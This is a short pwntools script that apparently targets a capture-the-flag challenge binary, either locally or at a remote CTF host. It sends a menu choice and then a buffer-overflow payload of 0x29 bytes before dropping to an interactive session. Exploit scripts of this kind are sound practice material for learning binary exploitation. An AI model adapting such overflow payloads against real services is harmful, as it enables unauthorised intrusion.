from pwn import*
context.arch="amd64"
context.terminal="xterm" #adjust this with ur terminal
b="./main"
#l = libc = ELF("./libc.so.6")
elf = e = context.binary = ELF(b)
DEBUG=0 # 0 remote , 1 local , 2 local + gdb
nc="nc ctf.taz.tn 10010"
r=nc.split(" ")
if DEBUG==1:
    p=process(b)
elif DEBUG==2:
    p=process(b)
    gdb.attach(p,""" b* vuln+ 203
        """)
else:
    p=remote(r[1],int(r[2]),ssl=False)

p.sendline(b"1")
p.send(b"a"*(0x28+1))

p.interactive()
